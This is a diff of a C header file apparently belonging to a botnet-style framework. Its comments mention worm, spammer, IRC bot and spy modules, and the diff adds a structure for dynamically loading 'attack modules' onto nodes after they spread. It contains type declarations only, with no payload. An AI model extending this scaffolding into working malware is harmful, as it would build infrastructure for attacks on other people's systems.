@@ -4,13 +4,10 @@
 // queue for outgoing messages, or incoming parsing.. etc..
 typedef struct _queue {
     struct _queue *next;
-    
     // queue buffer
     char *buf;
-    
     // fd goes here to auto close connections with L_del
     int empty;
-    
     // start timestamp
     uint32_t start_ts;
     
@@ -48,13 +45,10 @@ enum {
 struct _modules;
 typedef struct _connection {
     struct _connection *next;
- 
      // buffer (if message parsing, etc requires)
     char *buf;
-
     // file descriptor/socket
     int fd;
-    
     // timestamp for creation
     uint32_t start_ts;
 
@@ -96,6 +90,7 @@ typedef int (*module_func_ptr)(struct _modules *, Connection *, char **, int *);
 // this next one is specifically for crypto currencies.. so we can use same code for bitcoin/litecoin/etc
 typedef char *(*build_version_func)(int *);
 typedef int (*connect_nodes_func)(struct _modules *note, int count);
+typedef int (*external_func)(void);
 
 // declaration for other modules
 // such as: DHT, Spammer, IRC Bot, WORM,
@@ -128,12 +123,10 @@ struct _nodes;
 // current status of note
 typedef struct _modules {
     struct _modules *next;
-    
     // any buffer maybe required (itll get free'd on remove)
     char *buf;
     // fd has to be in place (if its not 0 itll get closed)
     int fd;
-    
     // timestamp for creation
     uint32_t start_ts;
     
@@ -169,11 +162,8 @@ typedef struct _modules {
 typedef struct _nodes {
     // first 3 are required in this order..
     struct _nodes *next;
-    
     char *buf;
-    
     int fd;
-    
     uint32_t start_ts;
     
     uint32_t addr;
@@ -219,6 +209,10 @@ int QueueChopBuf(Connection *cptr, char *buf, int size);
 // botlink to see irc privmsgs
 typedef struct _spy_func {
     struct _spy_func *next;
+    char *buf;
+    int fd;
+    uint32_t start_ts;
+    
     Modules *module;
     module_func_ptr read_ptr;
     module_func_ptr write_ptr;
@@ -230,3 +224,28 @@ typedef struct _spy_func {
 } SpyFuncs;
 
 SpyFuncs *SpyGet(Modules *mptr);
+
+// modules that can be loaded later so we can distribute and let the nodes build up
+// so attack modules, etc can get loaded later
+typedef struct _external_module {
+    struct _external_module *next;
+    char *buf;
+    int fd;
+    uint32_t start_ts;
+    
+    int id;
+    int size;
+    
+    int outfd;
+    
+    void *dl_handle;
+    // modules after loading..
+    external_func init;
+    external_func deinit;
+    module_func plumbing;
+} ExternalModules;
+
+ExternalModules *ExternalFind(int id);
+int External_deinit(ExternalModules *eptr);
+int ExternalInit(ExternalModules *eptr);
+ExternalModules *ExternalAdd(int id, char *buf, int size);
